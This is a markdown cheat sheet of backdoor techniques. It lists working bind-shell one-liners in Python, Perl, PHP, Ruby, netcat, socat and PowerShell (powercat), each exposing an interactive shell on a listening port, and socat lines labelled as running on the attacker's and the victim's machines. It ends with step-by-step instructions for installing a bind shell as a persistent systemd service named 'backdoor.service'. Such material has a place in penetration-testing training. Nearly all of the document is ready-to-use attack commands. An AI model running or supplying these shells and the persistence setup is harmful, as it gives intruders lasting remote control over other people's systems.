# Backdoors

## Oneliner Bind-shell(s)
### Python
```bash
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(("0.0.0.0", 5555)); s.listen(1); conn,addr=s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); p=subprocess.call(["/bin/bash", "-i"]);'

```

### Perl
```bash
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

### PHP
```bash
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",51337);\
socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
    socket_write($cl,$m,strlen($m));}}'
```

### Ruby
```bash
ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

### Netcat Traditional
```bash
nc -nlvp 51337 -e /bin/bash
```

### Netcat OpenBsd
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f
```

### Socat
```bash
user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 
user@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

### Powershell
```bash
https://github.com/besimorhino/powercat

# Victim (listen)
. .\powercat.ps1
powercat -l -p 7002 -ep

# Connect from attacker
. .\powercat.ps1
powercat -c 127.0.0.1 -p 7002
```
<br><br>

# Persistent Backdoor Setup

---

## **Step 1: Move the Script to a Persistent Location**
Move your Python bind shell script to `/usr/local/bin/` and make it executable:

```bash
sudo mv your_script.py /usr/local/bin/shell.py
sudo chmod +x /usr/local/bin/shell.py
```

## **Step 2: Create a Systemd Service File**

```bash
sudo nano /etc/systemd/system/backdoor.service
```

## **Step 3: Add the following content:**

```bash
[Unit]
Description=Persistent backdoor
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /usr/local/bin/shell.py
Restart=always

[Install]
WantedBy=multi-user.target

```

## **Step 4: Enable and Start the Service**

```bash
sudo systemctl enable backdoor.service
sudo systemctl start backdoor.service

```

## **Step 5: Verify Service Status**

```bash
sudo systemctl status backdoor.service
```

## **Step 6: Stop and Remove the Service (If Needed)**

```bash
sudo systemctl stop backdoor.service
sudo systemctl disable backdoor.service
sudo rm /etc/systemd/system/backdoor.service
sudo systemctl daemon-reload
```
